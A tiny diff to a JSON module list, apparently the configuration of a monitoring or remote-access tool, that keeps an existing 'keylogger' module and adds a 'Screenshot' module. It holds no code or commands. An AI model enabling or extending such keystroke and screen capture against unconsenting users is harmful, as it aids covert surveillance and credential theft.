@@ -1,3 +1,4 @@
 [
-    {"module": "keylogger"}
+    {"module": "keylogger"},
+    {"module": "Screenshot"}
 ]
